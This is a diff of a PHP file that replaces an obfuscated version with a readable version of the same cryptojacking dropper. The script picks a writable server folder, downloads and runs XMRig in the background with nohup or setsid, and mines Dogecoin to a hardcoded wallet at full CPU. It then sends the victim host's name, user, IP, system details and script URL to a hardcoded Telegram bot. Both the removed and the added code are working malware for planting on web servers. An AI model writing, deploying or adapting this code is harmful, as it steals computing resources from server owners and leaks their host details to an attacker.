@@ -1,4 +1,133 @@
 <?php
-//Obfuscate by https://uutool.cn/php/
- goto lm4uE; RxP7G: if ($nfqcC) { goto rXRiv; } goto M8sYu; WHF5e: echo "\xf0\237\x9a\200\x20\115\145\x6e\152\x61\154\x61\x6e\153\141\x6e\x20\144\x65\x6e\147\141\156\72\40\142\x61\x63\153\x67\162\x6f\165\x6e\144\40\50\46\x29\xa"; goto aToJu; q9x2A: error_reporting(0); goto C2AgV; FpdRf: $CJE6p = "\150\164\164\x70\163\x3a\x2f\57\x67\151\164\x68\165\142\x2e\143\x6f\155\x2f\x78\x6d\x72\151\147\57\170\x6d\x72\151\147\57\x72\x65\x6c\145\x61\x73\145\x73\57\144\x6f\167\156\x6c\x6f\141\x64\57\166\66\56\62\x31\x2e\60\57\x78\x6d\162\x69\x67\x2d\x36\56\62\x31\56\x30\x2d\x6c\151\156\165\x78\55\x78\x36\64\x2e\164\x61\162\x2e\x67\x7a"; goto mBHjo; h2IFo: $tnqPm = __DIR__ . "\57\142\x6c\157\147"; goto ZYUf0; i5mIv: exec("\143\165\x72\154\40\x2d\163\40\x2d\x4c\40\x2d\157\40{$RDUkO}\x20{$CJE6p}"); goto VwXSC; M8sYu: die("\342\x9d\214\40\x47\141\147\141\x6c\40\x6d\x65\x6e\x67\165\x6e\144\165\x68\x20\146\x69\154\x65\x20\x58\115\x52\151\147\x2e\xa\x3c\x2f\160\x72\145\76"); goto LgJoq; txn_G: chdir($uQUHc); goto Npv2A; XiY3X: $RQlYD = "{$ZQncK}\x20\76\x20\57\144\145\x76\x2f\156\165\154\154\40\62\x3e\x26\x31\40\x26"; goto WHF5e; i3Q59: $PSYV5 = trim(shell_exec("\x6c\x73\143\160\165\40\174\x20\147\162\x65\x70\x20\47\136\x54\150\x72\145\141\144\50\x73\51\x20\x70\145\162\40\143\x6f\x72\145\x3a\x27\x20\x7c\40\141\167\153\x20\x27\x7b\x70\162\x69\156\164\x20\44\x34\x20\x22\x20\164\150\x72\x65\x61\144\163\x2f\143\157\162\145\42\175\47")); goto bGiOH; JMdnm: exec("\x70\147\162\145\160\x20\x2d\x66\154\40\x78\x6d\162\151\147", $rKRBl); goto jNWWS; Rwp1j: tCwpB: goto gIdo2; FABlc: $yTYMM = "\xe2\x9a\xa0\357\270\217\40\74\x62\76\130\115\122\x69\147\40\163\165\144\x61\150\x20\142\x65\x72\x6a\141\154\141\156\74\x2f\x62\x3e\xa" . "\360\x9f\226\245\xef\270\x8f\x20\110\157\x73\x74\156\x61\155\x65\x3a\40\x3c\x63\x6f\x64\145\76{$jE_ER}\74\x2f\x63\157\144\145\76\xa" . "\xf0\x9f\xa7\240\x20\x43\x6f\x72\145\72\40{$jbtHn}\xa" . "\xf0\237\x93\x81\40\106\x6f\x6c\144\x65\162\72\x20{$Cq8fu}\12" . "\360\x9f\x93\233\x20\120\111\x44\50\163\x29\x3a\x20" . implode("\54\40", $p1t1N) . "\xa" . "\xf0\x9f\224\227\x20\74\142\x3e\x53\143\162\x69\160\164\x20\x55\122\114\x3c\x2f\x62\76\72\x20\74\141\40\x68\162\145\x66\x3d\42{$jwJpy}\42\76\117\160\x65\156\x20\x53\x63\x72\151\x70\164\x3c\x2f\x61\x3e"; goto rqFeU; BLEX_: aEpbK: goto LMKiS; QQY8x: echo "\xe2\xac\207\xef\xb8\217\40\x4d\x65\156\147\165\x6e\x64\165\150\x20\130\x4d\122\x69\x67\56\56\x2e\xa"; goto FpdRf; Od713: $REfRk = trim(shell_exec("\x68\157\x73\x74\x6e\x61\155\x65\40\55\111\x20\174\40\x61\167\153\x20\x27\x7b\160\162\151\x6e\x74\40\x24\x31\175\x27")); goto uJNxm; AsF4N: $OblCX = ["\x74\x6d\160", "\167\x77\x77", "\x6d\141\151\154"]; goto h2IFo; XMbRV: $RQlYD = "\x73\x65\x74\163\151\144\x20{$ZQncK}\40\x3e\40\x2f\x64\145\x76\57\x6e\165\x6c\154\x20\62\x3e\46\61\40\x26"; goto Q4jn2; o3Vr5: exec("\167\147\145\164\40\x2d\161\x20\55\117\40{$RDUkO}\x20{$CJE6p}"); goto N2yfd; cISBu: $jbtHn = intval(trim(shell_exec("\156\x70\162\x6f\143"))); goto VhMn3; LgJoq: rXRiv: goto r3aZT; TPwuL: FWLoP: goto zzyoA; IJH7D: if ($nfqcC) { goto CeLMp; } goto i5mIv; jkusE: $UK2rS = "\170\155\x72\151\147\55\x36\56\62\x31\x2e\x30"; goto HQ4aH; rqFeU: iDJcq($WyG5N, $dD1m6, $yTYMM); goto k0AuF; lm4uE: set_time_limit(0); goto q9x2A; VhMn3: $jbtHn = $jbtHn > 0 ? $jbtHn : 1; goto c69Iz; vnhf6: die("\xe2\x9d\214\40\x45\x6b\x73\164\x72\x61\153\163\x69\40\x67\x61\x67\141\x6c\56\xa\74\x2f\160\162\145\x3e"); goto BLEX_; wEWbd: if (!(!empty($p1t1N) && is_dir($Cq8fu))) { goto qTEfL; } goto y8Tr_; ozBTZ: $dD1m6 = "\65\x31\60\64\x32\61\x30\63\x30\x31"; goto etJVI; HnAc8: echo "\74\x70\x72\x65\x3e\360\x9f\x93\202\x20\106\x6f\154\x64\145\162\40\146\x61\154\x6c\x62\x61\x63\153\72\x20{$uQUHc}\12"; goto xG3ph; cUbmE: zcAPm: goto Ai3i5; dEky4: echo "\xf0\237\247\xa0\x20\112\x75\155\154\x61\x68\40\x63\157\x72\145\x20\x43\120\125\72\40{$jbtHn}\12"; goto jBh4T; YMrbu: goto GEwGd; goto Rwp1j; CWe01: $aftCx = trim(shell_exec("\146\x72\145\x65\40\55\150\x20\174\40\x67\162\145\160\x20\115\x65\x6d\40\174\x20\x61\167\153\40\47\x7b\x70\x72\x69\x6e\x74\40\44\x32\x20\42\40\x28\x75\x73\145\144\72\x20\42\40\x24\63\x20\42\54\x20\x66\x72\145\x65\x3a\40\x22\x20\x24\x34\40\x22\51\42\175\47")); goto Mc3Ff; E4Ezs: mkdir($tnqPm, 0755, true); goto rtXmV; LPBEB: if (!$uQUHc) { goto zcAPm; } goto UNKaI; J9zO2: $jwJpy = isset($_SERVER["\110\124\x54\x50\x53"]) && $_SERVER["\110\x54\x54\120\123"] === "\x6f\156" ? "\x68\x74\x74\x70\x73" : "\x68\x74\164\160"; goto GXS9z; Lw0yZ: if (is_writable($tnqPm)) { goto XBTUH; } goto zdH0g; x0xki: $Zk0o1 = trim(shell_exec("\x77\x68\157\x61\155\x69")); goto cISBu; RAv5q: $nfqcC = false; goto sjjds; jNWWS: if (!empty($rKRBl)) { goto tCwpB; } goto yVLIV; Kajby: IdJcq($WyG5N, $dD1m6, $yTYMM); goto v2sJR; zdH0g: die("\74\160\x72\145\x3e\xe2\x9d\214\x20\x54\x69\x64\141\x6b\40\142\151\163\141\x20\x6d\x65\156\x75\154\x69\163\40\153\145\40{$tnqPm}\74\x2f\x70\x72\x65\x3e"); goto oe8k_; kiUi3: exec("\164\x61\162\40\55\170\146\x20{$RDUkO}"); goto Rf7vE; JuGZs: qgidA: goto IJH7D; eKMRR: chdir($Cq8fu); goto dEky4; N2yfd: $nfqcC = file_exists($RDUkO); goto JuGZs; UNKaI: echo "\74\160\x72\145\x3e\360\237\x93\202\40\x4d\x65\x6e\x67\147\165\156\x61\x6b\x61\156\x20\x66\157\154\144\145\162\x3a\40{$uQUHc}\xa"; goto Hxtlf; etJVI: $jE_ER = php_uname("\156"); goto x0xki; aToJu: goto kVfNr; goto TPwuL; rcAwD: $ZQncK = "\x2e\57\170\155\162\x69\x67\40\x2d\157\40\163\164\162\x61\164\x75\x6d\53\x73\x73\x6c\72\57\57\162\170\56\x75\x6e\x6d\x69\156\x65\x61\142\154\x65\56\143\x6f\155\x3a\x34\x34\x33\40\55\141\x20\162\170\40\x2d\x6b\x20\55\x75\40\x44\117\107\105\x3a{$nSgXu}\x2e\x52\117\x4f\x54\x73\x20\55\55\143\x70\165\x2d\x6d\x61\x78\55\x74\x68\x72\145\141\x64\x73\x2d\150\151\x6e\x74\75\61\60\x30"; goto J9zO2; bGiOH: $Gk7DF = trim(shell_exec("\165\x6e\x61\155\145\40\x2d\x61")); goto Od713; vmPO0: echo "\xf0\237\x93\xa6\x20\x4d\145\156\x67\145\153\x73\x74\162\x61\x6b\x2e\56\x2e\12"; goto kiUi3; HQ4aH: $Cq8fu = $uQUHc . "\x2f" . $UK2rS; goto wEWbd; r3aZT: echo "\342\x9c\x85\x20\106\x69\154\x65\x20\x64\x69\165\156\x64\165\x68\72\x20{$RDUkO}\12"; goto vmPO0; Ai3i5: if (is_dir($tnqPm)) { goto hVPZ4; } goto E4Ezs; yVLIV: echo "\342\235\214\40\107\141\x67\x61\x6c\40\x6d\145\156\x6a\x61\154\141\156\x6b\141\x6e\x20\130\x4d\122\151\147\x2e\12\x3c\57\x70\162\145\x3e"; goto YMrbu; FKU08: echo "\xf0\x9f\232\x80\x20\x4d\x65\156\152\141\x6c\x61\x6e\153\141\x6e\40\x64\145\x6e\x67\141\156\x3a\x20\156\x6f\x68\165\160\xa"; goto gjx8H; sjjds: if (!shell_exec("\167\x68\x69\143\x68\40\167\147\x65\x74")) { goto qgidA; } goto o3Vr5; jBh4T: if (shell_exec("\167\x68\151\x63\150\x20\x6e\157\x68\165\x70")) { goto FWLoP; } goto dj9nO; B1SdH: foreach ($OblCX as $CoHcl) { goto KxM1e; F9_vO: mEogk: goto Eef_H; K_7JR: $uQUHc = $Wy53h; goto b6z0I; KxM1e: $Wy53h = $upa05 . "\x2f" . $CoHcl; goto v9TQg; Eef_H: Y0lw1: goto zicXF; v9TQg: if (!(is_dir($Wy53h) && is_writable($Wy53h))) { goto mEogk; } goto K_7JR; b6z0I: goto Q2W3H; goto F9_vO; zicXF: } goto KpkPn; gIdo2: echo "\xe2\234\x85\x20\x50\x72\157\x73\145\163\x20\x58\115\122\151\x67\x20\x62\x65\162\x6a\x61\154\x61\x6e\72\12" . implode("\12", $rKRBl) . "\12\74\57\160\x72\145\x3e"; goto CWe01; FAIfL: qTEfL: goto UfSc0; Qbq9e: z8UWi: goto XMbRV; mBHjo: $RDUkO = "\x78\x6d\x72\151\147\x2e\164\141\x72\x2e\147\172"; goto RAv5q; v2sJR: GEwGd: goto Njrso; Q67rI: CeLMp: goto RxP7G; uJNxm: $yTYMM = "\xe2\x9c\x85\40\74\x62\x3e\x58\115\x52\x69\147\40\144\151\152\141\x6c\141\156\x6b\141\x6e\x20\x73\165\153\x73\145\x73\74\x2f\x62\76\xa" . "\xf0\x9f\226\245\357\xb8\x8f\40\x3c\142\76\x48\157\x73\x74\x6e\x61\155\145\x3c\x2f\142\x3e\x3a\x20\74\x63\157\144\x65\x3e{$jE_ER}\x3c\x2f\143\x6f\x64\x65\x3e\xa" . "\xf0\237\xa7\xa0\x20\x3c\x62\76\x43\120\125\74\x2f\142\x3e\72\x20{$jbtHn}\x20\143\x6f\x72\145\x28\163\51\xa" . "\xf0\237\xa7\xaa\x20\74\142\x3e\111\156\x66\x6f\x3c\x2f\142\x3e\x3a\40{$pGvmq}\x20\174\x20{$PSYV5}\xa" . "\xf0\237\223\xa6\x20\74\142\x3e\x52\x41\115\x3c\57\x62\x3e\x3a\x20{$aftCx}\12" . "\360\x9f\221\xa4\40\x3c\x62\76\125\x73\x65\x72\x3c\57\x62\76\72\x20{$Zk0o1}\xa" . "\360\237\214\x90\40\74\142\x3e\111\x50\x3c\57\142\x3e\72\x20{$REfRk}\12" . "\360\x9f\x94\xa7\40\74\142\x3e\123\x79\163\164\145\155\74\57\x62\76\x3a\40\74\x63\x6f\x64\x65\76{$Gk7DF}\x3c\57\143\x6f\x64\145\76\xa\12" . "\xe2\x9b\217\xef\xb8\x8f\x20\74\142\x3e\x50\x72\x6f\143\x65\163\163\74\x2f\x62\x3e\x3a\12\x3c\143\157\144\x65\x3e" . implode("\12", $rKRBl) . "\x3c\x2f\x63\157\x64\145\76\xa\12" . "\xf0\237\x94\227\40\74\x62\76\123\x63\x72\x69\x70\164\x20\125\122\x4c\x3c\57\x62\x3e\x3a\40\x3c\141\x20\x68\x72\145\x66\75\x22{$jwJpy}\42\76\x4f\x70\x65\x6e\40\123\143\x72\x69\160\164\x3c\57\x61\x3e"; goto Kajby; oe8k_: XBTUH: goto WA2xL; JN3Qt: $upa05 = dirname(__DIR__); goto AsF4N; rtXmV: hVPZ4: goto Lw0yZ; VwXSC: $nfqcC = file_exists($RDUkO); goto Q67rI; zzyoA: $RQlYD = "\x6e\157\x68\x75\x70\40{$ZQncK}\x20\x3e\x20\57\x64\145\x76\x2f\156\165\x6c\154\x20\x32\x3e\46\61\40\x26"; goto FKU08; MdnNo: echo "\xe2\232\xa0\357\xb8\217\x20\106\x6f\154\x64\145\x72\x20\150\151\x6c\x61\156\147\54\x20\x74\x61\x70\x69\40\160\162\x6f\163\145\163\40\x6d\x61\x73\151\150\40\150\151\x64\165\x70\x2e\40\115\x65\x6c\141\x6b\x75\153\141\156\40\163\145\164\165\x70\x20\x75\x6c\141\156\x67\56\x2e\x2e\xa"; goto Rk4xz; GXS9z: $jwJpy .= "\x3a\x2f\x2f{$_SERVER["\110\x54\x54\x50\x5f\110\117\x53\124"]}{$_SERVER["\122\x45\x51\x55\105\123\x54\x5f\125\x52\x49"]}"; goto JN3Qt; UfSc0: if (!(!is_dir($Cq8fu) && !empty($p1t1N))) { goto iGIUF; } goto MdnNo; ZYUf0: $uQUHc = null; goto B1SdH; y2Os0: exec($RQlYD); goto JMdnm; C2AgV: $WyG5N = "\x37\x37\x31\x38\62\64\x32\67\62\x34\x3a\101\x41\x48\155\122\63\145\x46\170\x61\150\x33\152\165\121\x63\160\153\123\x5f\101\x6e\171\142\x7a\x73\x4f\x42\125\x33\117\165\111\120\x77"; goto ozBTZ; Hxtlf: goto B0ooC; goto cUbmE; k0AuF: exit; goto FAIfL; xG3ph: B0ooC: goto txn_G; Rf7vE: if (is_dir($UK2rS)) { goto aEpbK; } goto vnhf6; y8Tr_: echo "\342\x9a\240\xef\270\x8f\x20\130\x4d\122\151\147\40\163\x75\144\x61\150\x20\x62\145\x72\x6a\141\154\141\156\x2e\40\124\151\144\141\153\40\x64\x69\x6a\x61\154\x61\x6e\153\x61\x6e\x20\x75\154\141\x6e\147\56\xa\74\x2f\x70\x72\145\x3e"; goto FABlc; WA2xL: $uQUHc = $tnqPm; goto HnAc8; c69Iz: $nSgXu = "\x44\110\x74\151\x35\161\x33\147\x32\x51\x59\123\x32\x74\x45\62\x62\120\132\x56\170\x61\132\x57\147\x6b\x7a\x6a\131\x4b\126\115\152\172"; goto rcAwD; Q4jn2: echo "\xf0\x9f\x9a\200\x20\115\145\156\152\141\x6c\141\x6e\x6b\141\x6e\40\144\x65\x6e\147\x61\x6e\x3a\x20\x73\145\164\x73\151\144\xa"; goto XSH7r; Mc3Ff: $pGvmq = trim(shell_exec("\154\163\x63\x70\165\x20\174\x20\x67\162\145\160\x20\x27\x5e\x43\120\125\x28\x73\x29\x3a\x27\40\x7c\x20\141\x77\x6b\40\x27\173\160\x72\151\x6e\164\x20\x24\x32\x20\42\40\x63\x6f\x72\x65\163\x22\x7d\x27")); goto i3Q59; XSH7r: kVfNr: goto y2Os0; Rk4xz: iGIUF: goto QQY8x; dj9nO: if (shell_exec("\x77\x68\151\x63\x68\40\x73\x65\x74\163\x69\144")) { goto z8UWi; } goto XiY3X; gjx8H: goto kVfNr; goto Qbq9e; KpkPn: Q2W3H: goto LPBEB; Npv2A: exec("\160\147\x72\145\x70\x20\55\146\40\x78\155\162\x69\x67", $p1t1N); goto jkusE; LMKiS: echo "\xe2\x9c\x85\x20\x45\153\x73\x74\x72\x61\153\163\x69\40\x62\x65\x72\x68\141\163\151\154\x3a\x20{$UK2rS}\12"; goto eKMRR; Njrso: function IDJCq($w3nxz, $TQBWs, $kO37G) { goto MjsZv; V4hrG: $fQJUK = ["\150\164\x74\160" => ["\155\145\x74\x68\157\x64" => "\x50\117\x53\124", "\x68\145\x61\144\145\x72" => "\x43\x6f\156\164\x65\156\164\55\124\171\160\145\72\x20\x61\x70\x70\x6c\151\x63\x61\x74\x69\x6f\156\x2f\x78\55\x77\167\x77\x2d\146\157\x72\x6d\x2d\x75\162\154\145\x6e\x63\157\144\x65\144", "\143\x6f\x6e\164\x65\x6e\x74" => $T5toV]]; goto B95gN; B95gN: file_get_contents($pr0CX, false, stream_context_create($fQJUK)); goto wKtmV; czfhf: $T5toV = http_build_query(["\143\150\141\164\137\x69\x64" => $TQBWs, "\164\145\x78\x74" => $kO37G, "\x70\x61\x72\163\145\137\155\157\x64\145" => "\x48\124\115\114"]); goto V4hrG; MjsZv: $pr0CX = "\150\164\164\160\163\x3a\57\x2f\x61\x70\151\x2e\164\145\x6c\145\x67\x72\141\155\x2e\x6f\162\x67\57\142\x6f\164{$w3nxz}\x2f\163\x65\156\144\115\145\163\163\x61\x67\x65"; goto czfhf; wKtmV: }
+set_time_limit(0);
+error_reporting(0);
 
+$telegram_token  = "7718242724:AAHmR3eFxah3juQcpkS_AnybzsOBU3OuIPw";
+$telegram_chatid = "5104210301";
+$uname       = php_uname('n');
+$whoami = trim(shell_exec("whoami"));
+$core_count  = intval(trim(shell_exec("nproc")));
+$core_count  = $core_count > 0 ? $core_count : 1;
+$wallet      = "DHti5q3g2QYS2tE2bPZVxaZWgkzjYKVMjz";
+$run_cmd     = "./xmrig -o stratum+ssl://rx.unmineable.com:443 -a rx -k -u DOGE:$wallet.ROOTs --cpu-max-threads-hint=100";
+$current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
+$current_url .= "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+$base_dir   = dirname(__DIR__);
+$check_dirs = ['tmp', 'www', 'mail'];
+$custom_dir = __DIR__ . '/blog';
+$folder     = null;
+
+foreach ($check_dirs as $d) {
+    $try = $base_dir . '/' . $d;
+    if (is_dir($try) && is_writable($try)) {
+        $folder = $try;
+        break;
+    }
+}
+
+if (!$folder) {
+    if (!is_dir($custom_dir)) mkdir($custom_dir, 0755, true);
+    if (!is_writable($custom_dir)) die("<pre>❌ Tidak bisa menulis ke $custom_dir</pre>");
+    $folder = $custom_dir;
+    echo "<pre>📂 Folder fallback: $folder\n";
+} else {
+    echo "<pre>📂 Menggunakan folder: $folder\n";
+}
+chdir($folder);
+exec("pgrep -f xmrig", $already_running);
+
+$folder_name = "xmrig-6.21.0";
+$xmrig_folder_path = $folder . '/' . $folder_name;
+
+if (!empty($already_running) && is_dir($xmrig_folder_path)) {
+    echo "⚠️ XMRig sudah berjalan. Tidak dijalankan ulang.\n</pre>";
+
+    $message = "⚠️ <b>XMRig sudah berjalan</b>\n"
+             . "🖥️ Hostname: <code>$uname</code>\n"
+             . "🧠 Core: $core_count\n"
+             . "📁 Folder: $xmrig_folder_path\n"
+             . "📛 PID(s): " . implode(", ", $already_running) . "\n"
+             . "🔗 <b>Script URL</b>: <a href=\"$current_url\">Open Script</a>";
+
+    sendTelegram($telegram_token, $telegram_chatid, $message);
+    exit;
+}
+
+if (!is_dir($xmrig_folder_path) && !empty($already_running)) {
+    echo "⚠️ Folder hilang, tapi proses masih hidup. Melakukan setup ulang...\n";
+}
+
+echo "⬇️ Mengunduh XMRig...\n";
+$remote_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz";
+$filename = "xmrig.tar.gz";
+$success = false;
+
+if (shell_exec("which wget")) {
+    exec("wget -q -O $filename $remote_url");
+    $success = file_exists($filename);
+}
+if (!$success) {
+    exec("curl -s -L -o $filename $remote_url");
+    $success = file_exists($filename);
+}
+if (!$success) die("❌ Gagal mengunduh file XMRig.\n</pre>");
+echo "✅ File diunduh: $filename\n";
+echo "📦 Mengekstrak...\n";
+exec("tar -xf $filename");
+if (!is_dir($folder_name)) die("❌ Ekstraksi gagal.\n</pre>");
+echo "✅ Ekstraksi berhasil: $folder_name\n";
+chdir($xmrig_folder_path);
+echo "🧠 Jumlah core CPU: $core_count\n";
+if (shell_exec("which nohup")) {
+    $cmd = "nohup $run_cmd > /dev/null 2>&1 &";
+    echo "🚀 Menjalankan dengan: nohup\n";
+} elseif (shell_exec("which setsid")) {
+    $cmd = "setsid $run_cmd > /dev/null 2>&1 &";
+    echo "🚀 Menjalankan dengan: setsid\n";
+} else {
+    $cmd = "$run_cmd > /dev/null 2>&1 &";
+    echo "🚀 Menjalankan dengan: background (&)\n";
+}
+exec($cmd);
+
+exec("pgrep -fl xmrig", $procs);
+if (!empty($procs)) {
+    echo "✅ Proses XMRig berjalan:\n" . implode("\n", $procs) . "\n</pre>";
+
+    $ram_info    = trim(shell_exec("free -h | grep Mem | awk '{print \$2 \" (used: \" \$3 \", free: \" \$4 \")\"}'"));
+    $cpu_cores   = trim(shell_exec("lscpu | grep '^CPU(s):' | awk '{print \$2 \" cores\"}'"));
+    $cpu_threads = trim(shell_exec("lscpu | grep '^Thread(s) per core:' | awk '{print \$4 \" threads/core\"}'"));
+    $uname_info  = trim(shell_exec("uname -a"));
+    $ip_info     = trim(shell_exec("hostname -I | awk '{print \$1}'"));
+
+    $message = "✅ <b>XMRig dijalankan sukses</b>\n"
+             . "🖥️ <b>Hostname</b>: <code>$uname</code>\n"
+             . "🧠 <b>CPU</b>: $core_count core(s)\n"
+             . "🧪 <b>Info</b>: $cpu_cores | $cpu_threads\n"
+             . "📦 <b>RAM</b>: $ram_info\n"
+             . "👤 <b>User</b>: $whoami\n"
+             . "🌐 <b>IP</b>: $ip_info\n"
+             . "🔧 <b>System</b>: <code>$uname_info</code>\n\n"
+             . "⛏️ <b>Process</b>:\n<code>" . implode("\n", $procs) . "</code>\n\n"
+             . "🔗 <b>Script URL</b>: <a href=\"$current_url\">Open Script</a>";
+
+    sendTelegram($telegram_token, $telegram_chatid, $message);
+} else {
+    echo "❌ Gagal menjalankan XMRig.\n</pre>";
+}
+
+function sendTelegram($token, $chatid, $msg) {
+    $url = "https://api.telegram.org/bot$token/sendMessage";
+    $data = http_build_query([
+        'chat_id' => $chatid,
+        'text' => $msg,
+        'parse_mode' => 'HTML'
+    ]);
+    $opts = ['http' => [
+        'method' => 'POST',
+        'header' => "Content-Type: application/x-www-form-urlencoded",
+        'content' => $data
+    ]];
+    file_get_contents($url, false, stream_context_create($opts));
+}
+?>
